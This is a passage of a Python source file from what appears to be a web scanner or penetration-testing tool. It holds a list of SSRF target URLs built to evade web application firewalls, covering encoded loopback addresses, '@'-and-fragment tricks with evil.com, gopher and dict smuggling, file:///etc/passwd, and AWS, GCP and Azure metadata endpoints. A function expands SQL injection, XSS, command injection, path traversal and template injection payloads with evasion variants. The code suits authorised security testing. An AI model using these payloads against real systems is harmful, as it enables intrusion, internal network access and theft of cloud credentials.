    for payload, expected, technique in SSTI_WAF_BYPASS_PAYLOADS:
        yield payload, expected, technique


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SSRF Evasion
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SSRF_WAF_BYPASS_TARGETS: List[Tuple[str, str]] = [
    # ── IPv4 alternative representations ──
    ("http://0x7f000001/",                              "hex-ip"),
    ("http://2130706433/",                              "decimal-ip"),
    ("http://0177.0.0.1/",                              "octal-ip"),
    ("http://017700000001/",                             "full-octal-ip"),
    ("http://127.1/",                                    "short-loopback"),
    ("http://127.0.1/",                                  "short-loopback2"),
    ("http://0/",                                        "zero-ip"),

    # ── IPv6 variants ──
    ("http://[::1]/",                                    "ipv6-loopback"),
    ("http://[0:0:0:0:0:0:0:1]/",                       "ipv6-full"),
    ("http://[::ffff:127.0.0.1]/",                       "ipv6-mapped"),
    ("http://[0000::0001]/",                              "ipv6-padded"),

    # ── URL parsing tricks ──
    ("http://127.0.0.1@evil.com/",                       "at-sign-bypass"),
    ("http://evil.com#@127.0.0.1/",                      "fragment-bypass"),
    ("http://127.0.0.1%2523@evil.com/",                  "double-encode-at"),
    ("http://127.0.0.1:80/",                             "explicit-port"),
    ("http://127.0.0.1:443/",                            "port-443"),

    # ── DNS rebinding / TOCTOU ──
    ("http://spoofed.burpcollaborator.net/",              "dns-rebinding"),
    ("http://localtest.me/",                              "dns-localtest"),
    ("http://127.0.0.1.nip.io/",                         "nip-io"),
    ("http://customer1.app.localhost/",                   "subdomain-localhost"),

    # ── Protocol tricks ──
    ("gopher://127.0.0.1:25/_HELO",                      "gopher-smtp"),
    ("dict://127.0.0.1:11211/stat",                      "dict-memcached"),
    ("file:///etc/passwd",                                "file-protocol"),

    # ── Cloud metadata with evasion ──
    ("http://169.254.169.254/latest/meta-data/",         "aws-metadata"),
    ("http://[::ffff:169.254.169.254]/latest/meta-data/", "aws-ipv6"),
    ("http://169.254.169.254.nip.io/latest/meta-data/",  "aws-nip-io"),
    ("http://0xa9fea9fe/latest/meta-data/",              "aws-hex"),
    ("http://2852039166/latest/meta-data/",              "aws-decimal"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp-metadata"),
    ("http://169.254.169.254/metadata/instance",         "azure-metadata"),
]


def generate_ssrf_evasion_targets() -> Generator[Tuple[str, str], None, None]:
    """Generate WAF-evading SSRF target URLs.

    Yields (url, technique_name) tuples.
    """
    for url, technique in SSRF_WAF_BYPASS_TARGETS:
        yield url, technique


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Utility: Payload Expansion Strategy
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class EvasionLevel:
    """Controls how many evasion variants are generated.

    NONE:       Original payloads only (fastest, for non-WAF targets)
    LOW:        Originals + basic encoding (~2x payloads)
    MEDIUM:     + case alternation, comment insertion (~4x payloads)
    HIGH:       + composites, double encoding, all techniques (~8x payloads)
    AGGRESSIVE: Every technique including buffer overflow (~15x payloads)
    """
    NONE = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    AGGRESSIVE = 4


def expand_payloads(
    base_payloads: List[str],
    category: str,
    level: int = EvasionLevel.MEDIUM,
    marker: str = "",
) -> List[str]:
    """Expand a list of base payloads with WAF evasion variants.

    Args:
        base_payloads: Original payloads
        category: "sqli", "xss", "cmdi", "path", "ssti"
        level: EvasionLevel constant
        marker: For XSS payloads, the marker string

    Returns:
        Expanded list of payloads (originals first, then evasion variants)
    """
    if level == EvasionLevel.NONE:
        return list(base_payloads)

    expanded = list(base_payloads)
    seen = set(base_payloads)

    if category == "sqli":
        # Limit variants based on level
        max_per_transform = {
            EvasionLevel.LOW: 3,
            EvasionLevel.MEDIUM: 5,
            EvasionLevel.HIGH: 8,
            EvasionLevel.AGGRESSIVE: len(base_payloads),
        }.get(level, 5)

        for mutated, _technique in generate_sqli_evasion_payloads(base_payloads, max_per_transform):
            if mutated not in seen:
                expanded.append(mutated)
                seen.add(mutated)

        # Add pre-built WAF bypass payloads
        limit = {1: 10, 2: 25, 3: 40, 4: len(SQLI_WAF_BYPASS_PAYLOADS)}.get(level, 25)
        for payload, _technique in SQLI_WAF_BYPASS_PAYLOADS[:limit]:
            if payload not in seen:
                expanded.append(payload)
                seen.add(payload)

    elif category == "xss" and marker:
        limit = {1: 10, 2: 20, 3: 35, 4: 60}.get(level, 20)
        count = 0
        for payload, _technique in generate_xss_evasion_payloads(marker):
            if payload not in seen:
                expanded.append(payload)
                seen.add(payload)
                count += 1
                if count >= limit:
                    break

    elif category == "cmdi":
        limit = {1: 8, 2: 15, 3: 25, 4: len(CMDI_WAF_BYPASS_PAYLOADS)}.get(level, 15)
        count = 0
        for payload, _dtype, _tech in generate_cmdi_evasion_payloads():
            if payload not in seen:
                expanded.append(payload)
                seen.add(payload)
                count += 1
                if count >= limit:
                    break

    elif category == "path":
        limit = {1: 8, 2: 15, 3: 25, 4: len(PATH_WAF_BYPASS_PAYLOADS)}.get(level, 15)
        count = 0
        for payload, _tech in generate_path_traversal_evasion_payloads():
            if payload not in seen:
                expanded.append(payload)
                seen.add(payload)
                count += 1
                if count >= limit:
                    break

    elif category == "ssti":
        limit = {1: 5, 2: 10, 3: 18, 4: len(SSTI_WAF_BYPASS_PAYLOADS)}.get(level, 10)
        count = 0
        for payload, _expected, _tech in generate_ssti_evasion_payloads():
            if payload not in seen:
                expanded.append(payload)
                seen.add(payload)
                count += 1
                if count >= limit:
                    break

    return expanded
